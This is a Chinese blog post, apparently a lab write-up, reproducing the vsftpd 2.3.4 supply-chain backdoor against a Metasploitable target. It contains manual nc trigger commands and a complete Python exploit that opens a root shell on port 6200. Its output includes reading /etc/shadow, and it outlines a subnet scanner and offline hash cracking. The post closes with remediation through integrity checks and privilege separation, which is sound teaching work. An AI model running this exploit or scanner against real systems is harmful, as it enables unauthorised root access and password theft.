---
title: 'vsftpd 2.3.4 笑脸后门：从手工触发到 Python PoC'
date: 2026-11-08 14:45:00
updated: 2026-11-08 14:45:00
categories:
  - 网络渗透
tags:
  - vsftpd
  - 供应链安全
  - 漏洞复现
  - Python
  - Metasploitable
description: 复现 vsftpd 2.3.4 源码投毒后门，手工触发后写成 Python PoC，并回到源码分析成因与修复方案。
cover: /img/index-banner.jpg
top_img: /img/index-banner.jpg
---


> 2011 年 6 月，vsftpd 2.3.4 的官方源码包里被人塞进了一段后门。任何人在 FTP 用户名里打一个 `:)`，服务器的 6200 端口就会默默开出一个 root shell。
>
> 这篇是一次完整复现：怎么确认目标、怎么手工触发、怎么把整个过程写成 Python 脚本、怎么证明它不是"能连上"而是真正拿到了 root。最后回到源码，回答两个问题——**这个洞为什么会出现，以及该怎么修**。
>
> 环境：Kali（攻击机 `192.168.23.128`）+ Metasploitable 2（靶机 `192.168.23.129`），VMware NAT 同一网段，不依赖任何外网服务。
>
> 所有实验只在本地隔离网络内进行。对任何未授权目标使用本文方法均属违法。

---

### 目录

- [第 1 站：笑脸漏洞 —— 手工走通](#第-1-站：笑脸漏洞-——-手工走通)
- [第 2 站：源码分析 —— 成因与修复](#第-2-站：源码分析-——-成因与修复)
- [附录](#附录)

---

## 第 1 站：笑脸漏洞 —— 手工走通

### 1.1 先说清楚：这不是"漏洞"，是投毒

vsftpd 2.3.4 的"笑脸后门"在网上的教程里常被当成一个普通漏洞讲，这个说法不准确，而且会直接影响你后面怎么写"成因分析"和"修复方案"。

**2011 年 6 月，vsftpd 官方发布的 2.3.4 版本源码包被人下载后篡改，重新打包上传到镜像站。** 官方原版代码是干净的。全球大量服务器从镜像站装上了这个包——中间没有任何人核对过"我下的这份源码，和作者发布的是不是同一份"。

被改的是两个文件：

| 文件 | 加了什么 |
|---|---|
| `str.c` | 在处理用户名的函数里，检测字节序列 `0x3a 0x29`，也就是 ASCII 的 `:)` |
| `sysutil.c` | 新增函数 `vsf_sysutil_extra()`：建 socket → bind 到 **6200** 端口 → listen → accept → 把标准输入输出重定向过去 → `execve("/bin/sh")` |

整条链路：

```
攻击者连 21 端口
  └─ 发 USER 用户名含 :)
        └─ vsftpd 命中后门分支
              └─ 调用 vsf_sysutil_extra()
                    └─ 在 6200 端口开一个 shell，等人来连
                          └─ 连上去 = root shell
```

**为什么拿到的是 root，而不是 ftp 用户？**

因为 FTP 要监听 21 这个特权端口（小于 1024 的端口只有 root 能绑）。所以 vsftpd 主进程必须以 root 启动，处理完认证之后再降权到 `ftp` 用户。**但后门代码是在主进程 fork 出的子进程里执行的，走的是另一条路，根本没有经过降权那一步。**

一句话：**以高权限运行了不必要的代码。** 这句话后面会出现在修复建议里。

对照系列第一篇里 DVWA 的表现：

| | vsftpd 后门 | DVWA 一类 Web 应用 |
|---|---|---|
| 成因 | **分发包被篡改，源码完整性失守** | **代码本身写错了** |
| 修复 | 哈希校验、签名验证、只从官方源装包 | 改代码：预处理语句、输出编码 |
| 攻击面 | 供应链 | 应用逻辑 |

**这两类漏洞的修复方案完全不通用**，写报告时混在一起写会被一眼看出没想清楚。

---

### 1.2 先手工走通，再写代码

写 PoC 之前必须先用现成工具跑通一次。理由很实在：

> 如果手工都走不通，代码一定走不通；而且到时候你分不清是**漏洞没触发**还是**代码写错了**，会在两个维度之间反复瞎猜。

#### 第 1 步：确认目标状态

```bash
nmap -p 21,6200 192.168.23.129
```

![后门未触发](/img/vsftpd-01-not-triggered.png)

判断标准：

```
21/tcp   open  ftp
6200/tcp closed lm-x
MAC Address: 00:0C:29:5B:DF:FA (VMware)
```

- **`21` 开着、`6200` 关着** → 后门还没被触发，状态干净，可以开始。
- **`6200` 已经 open** → 说明之前有人（或你自己）触发过，后门子进程还挂着。这时候直接连 6200 就行，或者重启靶机重新来。

顺带记一个细节：nmap 的端口表把 6200 标成 `lm-x`，那是历史上占用这个端口的另一个服务的名字，**跟 vsftpd 没有任何关系**。看到这个名字别以为扫错了东西。

#### 第 2 步：发一句带笑脸的用户名

```bash
printf 'USER test:)\r\nPASS test\r\n' | nc -w 3 192.168.23.129 21
```

![触发后门](/img/vsftpd-02-trigger.png)

```
220 (vsFTPd 2.3.4)
331 Please specify the password.
```

两个数字的含义：

| 响应 | 含义 |
|---|---|
| `220 (vsFTPd 2.3.4)` | 欢迎语，**同时泄露了版本** ← 后面 PoC 的检测依据 |
| `331` | 用户名已接受，正在等密码 |

**登录并没有成功，也不需要成功。** `331` 之后不管密码对不对，后门都已经开了——这是这个案例最讽刺的地方：**它连"绕过认证"都算不上，认证流程根本没走完。**

这行命令里有三个必须抠的细节：

| 写法 | 为什么不能换 |
|---|---|
| `printf` 而不是 `echo` | `echo` 在不同 shell 里对 `\r` 的处理不一致，`printf` 才可靠 |
| `\r\n` | **FTP 协议的换行是回车 + 换行两个字节**。只发 `\n`，服务端会一直等你把这一行发完，命令不结束，后门不触发 |
| `nc -w 3` | 连上后最多等 3 秒。不加这个，`nc` 会一直挂着不返回 |

#### 第 3 步：看 6200 活了没有

```bash
nmap -p 6200 192.168.23.129
```

![后门激活](/img/vsftpd-03-activated.png)

```
6200/tcp open  lm-x
```

**这个端口本来是关的，现在开了。开它的不是 vsftpd 的正常功能，是后门自己起的监听。**

#### 第 4 步：连上去

```bash
nc 192.168.23.129 6200
```

连上之后屏幕一片空白，光标停着不动——**这是正常的**。后门起的是 `/bin/sh`，它不打印提示符。直接敲：

```
id
uname -a
```

![root shell](/img/vsftpd-04-root-shell.png)

```
uid=0(root) gid=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

这张图必须同时包含三样东西，才构成完整证据链：

1. 我用的命令 —— `nc 192.168.23.129 6200`
2. 拿到的权限 —— `uid=0(root)`
3. 目标是哪台机器 —— `metasploitable`

**只截 `uid=0` 是不够的**，别人会问"这是在哪台机器上执行的"。内核 `2.6.24-16-server`、编译日期 2008 年 4 月，比我手上这台 Kali 老了好几代，也对得上靶机的身份。

---

### 1.3 PoC 的五段结构

手工走通之后，把它翻译成代码。五段：

| 片段 | 做什么 | 难点 |
|---|---|---|
| ① banner 获取 | 连 21，读 `220 (vsFTPd 2.3.4)` | 自己管超时、自己收字节 |
| ② 触发 | 发 `USER x:)\r\nPASS x\r\n` | `\r\n` 必须是字节串 |
| ③ 检测 | 连 6200，看通不通 | 区分"连接被拒"和"连接超时" |
| ④ 利用 | 连 6200，发命令，收结果 | shell 没有提示符，只能靠等待收数据 |
| ⑤ 封装 | 加参数、能扫网段 | 并发、超时、结果汇总 |

#### 一个必须先想清楚的设计问题

这一步很多人想不到，但它决定你的 PoC 是"能跑一次"还是"能用"。

**检测 6200 这件事本身，会消耗掉后门。**

后门在 `accept()` 上阻塞着等人连。你一 `connect`，`accept` 立刻返回，子进程就把自己 `dup2` + `execve` 成 shell —— **它不再监听了**。

所以：

```python
# 错误做法：先探测，再连接
if port_open(host, 6200):
    shell = connect(host, 6200)   # 后门在探测那一步就被吃掉了
```

```python
# 正确做法：连上就干活，一次连接里既验证又利用
out = execute(host, "id; hostname")
if out is None:
    # 连不上 = 后门没开
```

网上很多 PoC 只能扫一遍、第二次就失效，全都是犯了同一个错。

---

### 1.4 完整代码

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vsftpd 2.3.4 后门检测与利用 PoC  (CVE-2011-2523)

原理:
    vsftpd 2.3.4 的源码包在 2011 年被第三方篡改并分发。
    篡改点在 str.c: 处理用户名的代码里检测到 ":)" (0x3a 0x29) 时,
    调用 sysutil.c 中新增的 vsf_sysutil_extra(), 该函数在 6200 端口
    绑定一个 /bin/sh 并等待连接。由于主进程以 root 运行, 得到的 shell 即 root。

设计要点:
    后门的 accept() 只接受一次连接, 一旦连上就 execve 成 shell 不再监听。
    因此不能"先探测 6200 是否开放、再重新连接利用" —— 探测本身就消耗了后门。
    正确做法是: 一次连接里既完成验证, 又执行命令, 从回显判断结果。

仅限本地隔离靶场, 禁止用于未授权目标。
"""
import socket
import sys
import time

FTP_PORT = 21
BACKDOOR_PORT = 6200
TIMEOUT = 5


def grab_banner(host):
    """连接 21 端口, 读取欢迎语作为版本指纹"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        s.connect((host, FTP_PORT))
        data = s.recv(1024)
        return data.decode("utf-8", errors="replace").strip()
    finally:
        s.close()


def trigger_backdoor(host):
    """发送含 ":)" 的用户名, 触发后门在 6200 起 shell"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        s.connect((host, FTP_PORT))
        s.recv(1024)                        # 读掉 220 欢迎语
        s.sendall(b"USER test:)\r\n")       # 触发点: 用户名里的 :)
        s.sendall(b"PASS test\r\n")
        s.recv(1024)                        # 读掉 331, 内容不关心
        time.sleep(1)                       # 给后门子进程一点启动时间
    finally:
        s.close()


def execute(host, command="id"):
    """连接 6200 执行命令。这一次连接同时完成验证与利用。"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        s.connect((host, BACKDOOR_PORT))
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None                         # 连不上 = 后门未激活

    try:
        s.sendall(command.encode() + b"\n")
        time.sleep(0.5)
        s.settimeout(2)
        buf = b""
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
        return buf.decode("utf-8", errors="replace").strip()
    finally:
        s.close()


def main():
    if len(sys.argv) < 2:
        print("用法: python3 poc_vsftpd.py <目标IP> [要执行的命令]")
        return

    host = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id; hostname"
    print("[*] 目标: %s" % host)

    try:
        banner = grab_banner(host)
    except Exception as e:
        print("[-] 无法连接 21 端口: %s" % e)
        return
    print("[*] banner: %s" % banner)

    if "2.3.4" not in banner:
        print("[-] 版本不是 2.3.4, 不存在该后门")
        return

    print("[*] 版本命中 2.3.4, 发送触发载荷 ...")
    trigger_backdoor(host)

    out = execute(host, command)
    if out is None:
        print("[-] 6200 未开放, 后门未激活 (可能已被其它连接占用)")
    else:
        print("[+] 漏洞存在, 执行 [%s] 回显:" % command)
        print(out)


if __name__ == "__main__":
    main()
```

源码分三屏截图（都用 `cat -n` 带行号，方便正文引用具体行）：

![源码上：1-40 行](/img/vsftpd-05-src-a.png)

![源码中：79-106 行](/img/vsftpd-06-src-b.png)

![源码下：105-118 行](/img/vsftpd-07-src-c.png)

#### 四个必须看懂的写法

| 代码 | 为什么必须这么写 |
|---|---|
| `b"USER test:)\r\n"` | **必须是 bytes**。socket 只收字节，写成普通字符串会 `TypeError`。而且 `\r\n` 一个字节都不能少 |
| `sendall()` 而不是 `send()` | `send` 只保证"发出去了其中一部分"，大包可能被截断。`sendall` 会循环到发完为止 |
| `s.recv(1024)` 读两次 | 一次对应 220，一次对应 331。**不把旧数据读掉，后面读到的就是错位的响应** |
| `execute` 里 `return None` | 连接被拒 = 后门没开，这是"负结果"。必须和"连上了但没回显"区分开 |

第三条是最容易出问题的地方。TCP 是**字节流**，不是消息流：服务器连发两句响应，可能一次 `recv` 就全收到了，也可能分成两次。FTP 协议靠 `\r\n` 分帧，所以要严格按行读——但对这个 PoC 来说，只要保证"发命令前把旧数据读掉"就够了。

---

### 1.5 验证：从 `id` 到 `/etc/shadow`

#### 跑起来

```bash
python3 ~/poc_vsftpd.py 192.168.23.129
```

![PoC 运行](/img/vsftpd-08-poc-run.png)

```
[*] 目标: 192.168.23.129
[*] banner: 220 (vsFTPd 2.3.4)
[*] 版本命中 2.3.4, 发送触发载荷 ...
[+] 漏洞存在, 执行 [id; hostname] 回显:
uid=0(root) gid=0(root)
metasploitable
```

五行输出，覆盖完整证据链：**版本命中 → 载荷发出 → 漏洞确认 → root 权限 → 目标确认**。

#### 证明它是"任意命令执行"

`id` 只说明身份，不说明**能做什么**。跑这条：

```bash
python3 ~/poc_vsftpd.py 192.168.23.129 "cat /etc/shadow | head -3"
```

![任意命令执行](/img/vsftpd-09-rce.png)

```
[+] 漏洞存在, 执行 [cat /etc/shadow | head -3] 回显:
root:$1$****...****:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
```

`/etc/shadow` 的权限是 `600 root:root`。普通用户执行 `cat` 会立刻 `Permission denied`。**能读出内容，说明这条 shell 背后没有任何限制——这就是 RCE（远程命令执行），不是"提权"也不是"信息泄露"。**

这张图在发布时我把哈希值涂掉了。理由说清楚：

- 虽然是靶场默认口令，但**"贴出 `/etc/shadow` 全文"这个动作本身在甲方眼里就是红线**，养成习惯比什么都重要
- 只露出 `$1$` 这三个字符就够了——它已经说明算法是 MD5-crypt，读者能理解危害，但没法拿去跑

#### shadow 格式速读

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
 ↑        ↑            ↑                     ↑
用户名   算法+salt    摘要                最后修改(天数)
```

| 字段 | 值 | 含义 |
|---|---|---|
| `$1$` | MD5-crypt | **1994 年的算法**，一块普通显卡每秒能试几十亿次 |
| `14747` | 天数 | 从 1970-01-01 起算 → **2010 年 5 月** |
| `daemon:*` 里的 `*` | 锁定 | 该账户不允许登录，没有可用密码 |

对比一下现代 Linux：`$6$` 是 SHA-512，`$y$` 是 yescrypt，慢几个数量级，就是为了对抗这种离线爆破。

完整的拿密码流程是：**读 shadow → 拿到 `$1$` 哈希 → 扔进 hashcat 离线爆破 → 密码到手**。全程不用再碰服务器，离线慢慢算，不会产生任何告警。

---

### 1.6 从"打一台"到"扫一片"

单目标能打，就该写成能扫网段的版本。`scan_vsftpd.py` 相对单目标版只多了三件事：

| 改动 | 为什么 |
|---|---|
| **50 线程并发** | 254 个地址串行跑要等好几分钟，并发后几秒 |
| **先验 banner 再触发** | 不是 2.3.4 直接跳过，**避免对无关服务乱发载荷** |
| **结果汇总** | 只打印命中的，不刷屏 |

![网段扫描](/img/vsftpd-10-scan.png)

```
[*] 扫描 192.168.23.0/24 ...
[*] 扫描完成, 命中 1 台
```

254 个地址，只命中了 `.129`。

**"先验 banner 再触发"这一条值得单独说。** 新手写扫描器最容易犯的错是"发现端口开着就发载荷"——在真实环境里，这意味着你会往一堆跟漏洞无关的服务上灌垃圾数据，轻则触发 IDS 告警，重则把生产服务搞挂。**指纹先行、载荷后发**，是不惹事的底线。

---

### 1.7 三个坑，每个都花了一小时

这一节是整篇里最实用的部分。它们跟渗透技术无关，但每一个都能让你卡住半天。

#### 坑 1：零宽字符让 `main()` 永远不执行

脚本写好后跑起来，**一个字都不输出**，连报错都没有。

原因是这一行：

```python
if __name__ == "__6#8203;main__":
```

`6#8203;` 是 HTML 实体 `&#8203;` 被吃掉了一个 `&`。而 `&#8203;` 代表 **U+200B 零宽空格**——一个肉眼完全看不见的字符。

![零宽字符](/img/vsftpd-12-zwsp.png)

![零宽字符全文](/img/vsftpd-13-zwsp-full.png)

**它怎么来的**：`__name__` 这种双下划线在 Markdown 里会被当成"加粗"标记，所以从聊天框复制代码时，渲染层往里插了一个零宽字符来防止格式被破坏。结果 `"__main__"` 变成了 `"__零宽空格main__"`，Python 比较字符串当然不相等，`main()` 永远不会被调用。

**排查方法**：

```bash
grep -n "__main__" poc_vsftpd.py      # 看引号里干不干净
cat -A poc_vsftpd.py | grep -n 'M-bM-^@M-^K'   # M-bM-^@M-^K 就是零宽空格的可见形式
```

**规矩**：凡是代码里出现 `__xxx__`、`$_GET`、`<?php` 这类符号，**一律手打，或者走文件传输，不要从聊天框、网页、PDF 里直接复制粘贴**。后来我改成用共享文件夹传整个文件，从源头上断掉了这条路。

#### 坑 2：`nano is out of memory!`

零宽字符还没修完，又撞上第二个：往 nano 里粘贴几十行代码时，nano 直接崩溃。

![nano 崩溃](/img/vsftpd-14-nano-crash.png)

原因是**终端会把粘贴当成"大量按键"一次性灌给 nano**，nano 的输入缓冲区承受不了。

崩溃之后更麻烦的是：那些残留字符留在终端里，看起来像一串命令，但其实**一条都没执行**，而且 `Ctrl+O` 保存也没成功——文件直接没了。

![文件丢失](/img/vsftpd-15-file-lost.png)

**教训**：不要用"粘贴长代码到终端编辑器"这个流程。正确做法是**把文件放到能互通的地方，用 `cp` 拿过来**。

#### 坑 3：共享文件夹路径"不存在"

VMware 加共享文件夹时，路径填 `C:\Users\lenovo\WorkBuddy\2026-10-31-13-46-46`，它报"为路径指定的目录不存在"。

![共享路径](/img/vsftpd-16-share-path.png)

路径本身是对的（那个目录真实存在），问题在**复制粘贴时又带进了不可见字符**——跟坑 1 是同一类问题，只是这次它骗过了我，让我以为路径错了。

**两个解决办法**：

1. **点右边的「浏览」按钮一层层点进去选**，浏览器给出的路径一定是干净的
2. **换短路径**。把工作目录改成 `C:\Users\lenovo\share`，21 个字符，肉眼可校验

最后用的是第二个方案，顺便把它当成后面所有文件的"中转站"：

```
Windows: C:\Users\lenovo\share\        ← 我在这里写文件
Kali:    /mnt/hgfs/share/              ← 通过 VMware 共享挂载访问
```

挂载命令（**热加，不需要关机**）：

```bash
sudo mkdir -p /mnt/hgfs
sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
ls /mnt/hgfs/share/
```

![sudo 挂载](/img/vsftpd-17-share-mount.png)

**这条路一通，后面所有代码、所有源码包、所有截图全走它，再没碰过剪贴板。**

---

## 第 2 站：源码分析 —— 成因与修复

这一节回答两个问题：这个后门为什么能存在两年多没被发现，以及如果换成你来防，该在哪些环节设卡。

### 2.1 成因分类

vsftpd 这个案例特殊的地方在于：**它不是一个"写错了的代码"，而是一个"被人改过的代码"。** 所以拿它和后面皮卡丘那些漏洞对照，能看清一条很实用的分界线：

| # | 成因类型 | 本次案例 | 一句话本质 |
|---|---|---|---|
| 1 | **分发包被篡改** | vsftpd 2.3.4 后门 | 你信任的"来源"本身不可信 |
| 2 | **权限过大** | vsftpd 以 root 跑后门代码 | 高权限 × 不必要的代码 = 灾难 |

两类的修复方向完全不通用：**第 1 类改代码没用**（代码本身就是被改过的），只能在下游做完整性校验；**第 2 类必须改架构**，把高权限和业务逻辑拆开。

这也是事后复盘时最容易被混为一谈的地方——报告里把"供应链投毒"和"代码缺陷"写在一起，一眼就能看出没想清楚。


### 2.2 逐条修复

#### 修复 1：供应链完整性（对应后门本身）

这类问题**改代码没有用**，因为代码本身就是被改过的。只能在"拿代码"这一环做文章：

| 措施 | 具体做法 |
|---|---|
| **校验哈希** | 官方发布时公布 SHA-256，装之前 `sha256sum vsftpd-2.3.4.tar.gz` 比对 |
| **签名验证** | 上游用 GPG 签名，装之前 `gpg --verify` |
| **只用官方源** | 发行版仓库的包有维护者签名，比"官网 tar 包"更可信 |
| **锁版本 + 留档** | 生产环境固定版本，把用过的包存档，出问题能回溯 |

**这个案例最有价值的地方在于：它证明了"从官网下载"也不安全。** 攻击者改的是镜像站上的包，而大量管理员默认"镜像站=官网"。**完整性校验不是形式主义，它是唯一能发现这类问题的手段。**

#### 修复 2：权限最小化（对应 vsftpd）

vsftpd 必须在 21 端口监听，所以主进程不得不以 root 启动。**但它不该在 root 身份下执行那么多路径的代码。**

| 措施 | 说明 |
|---|---|
| **尽早降权** | 主进程只负责 `bind` + `accept`，拿到连接后立刻 `setuid` 到低权限用户再处理业务 |
| **权限分离** | 监听进程和会话进程分开，会话进程永远不以 root 跑 |
| **`chroot` / 沙箱** | 把进程限制在一个目录树里 |
| **容器化 + 只读根文件系统** | 即使被拿下，也写不进系统目录 |

这个案例里，后门代码之所以能直接给 root shell，就是因为**它运行在未降权的主进程上下文里**。如果 vsftpd 像 OpenSSH 那样做了严格的权限分离（`PrivilegeSeparation`），同样的后门最多只能拿到一个低权限 shell——危害等级从"服务器沦陷"降到"一个沙箱内的文件泄露"。

---

## 附录

### A. 脚本清单


| 文件 | 作用 | 行数 |
|---|---|---|
| `poc_vsftpd.py` | 单目标：banner → 触发 → 利用，可指定任意命令 | 118 |
| `scan_vsftpd.py` | 网段扫描：50 线程 + 先验 banner + 结果汇总 | — |

### B. 命令速查


```bash
# ---- 靶机存活与端口 ----
nmap -sn 192.168.23.0/24                        # 只做主机发现
nmap -p 21,6200 192.168.23.129                  # 指定端口
nmap -sS -sV -T4 192.168.23.129                 # SYN 半开 + 版本探测

# ---- 手工触发后门 ----
printf 'USER test:)\r\nPASS test\r\n' | nc -w 3 192.168.23.129 21
nmap -p 6200 192.168.23.129
nc 192.168.23.129 6200

# ---- 表单提交（别忘 submit） ----
curl -s -d "username=admin&password=123456&submit=Login" <URL> | grep "login success"

# ---- 会话与 cookie ----
curl -s -c ck.txt -o /dev/null <登录页>
curl -s -b ck.txt -c ck.txt -o /dev/null -D - <验证码图地址> | grep -i set-cookie

# ---- 共享目录 ----
sudo mkdir -p /mnt/hgfs
sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
ls /mnt/hgfs/share/

# ---- 代码卫生检查（粘贴污染排查） ----
grep -n "__main__" file.py
cat -A file.py | grep -n 'M-bM-^@M-^K'      # 零宽空格
```

### C. 截图清单

| 编号 | 内容 |
|---|---|
| 01-01 | 后门未触发：`21 open` / `6200 closed` |
| 01-02 | 触发后门：`printf` 载荷 + `220` / `331` |
| 01-03 | 后门激活：`6200 open` |
| 01-04 | root shell：`nc` + `id` + `uname -a` |
| 01-05~07 | 源码上/中/下：`cat -n poc_vsftpd.py` |
| 01-08 | PoC 运行：五行完整证据链 |
| 01-09 | 任意命令：`cat /etc/shadow`（哈希已打码） |
| 01-10 | 网段扫描：254 个地址命中 1 台 |
| 01-11 | 主机失联：nmap `Host seems down` |
| 01-坑1 | 零宽字符：`__main__` 中间被插入不可见字符 |
| 01-坑2 | nano 崩溃：粘贴过长导致编辑器 OOM |
| 01-坑3 | 共享路径：VMware 报"目录不存在" |

配图在 `/img/` 目录。

### D. 下一篇

这一个洞打的是"服务器上有后门"，下一个问题是：**服务器上跑的业务代码本身写错了，会怎样。**

→ 《皮卡丘靶场：暴力破解三关与验证码绕过》（`皮卡丘靶场-暴力破解-博客稿.md`）——在本地搭一个 PHP 靶场，从零写爆破脚本，再用三关验证码把"防护做错了"讲透。
